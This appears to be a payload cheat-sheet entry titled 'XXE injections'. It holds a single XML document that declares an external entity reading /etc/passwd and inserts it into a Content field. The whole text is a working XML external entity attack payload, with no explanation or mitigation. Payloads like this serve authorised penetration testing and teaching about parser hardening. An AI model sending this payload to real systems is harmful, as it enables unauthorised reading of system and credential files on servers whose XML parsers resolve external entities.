# XXE injections 

```xml
<?xml version="1.0" standalone="no" ?>
<!DOCTYPE doc [
<!ENTITY otherFile SYSTEM "/etc/passwd">
]>
<cache>
	<Author></Author>
	<Subject></Subject>
	<Content>&otherFile;</Content>
</cache>
```
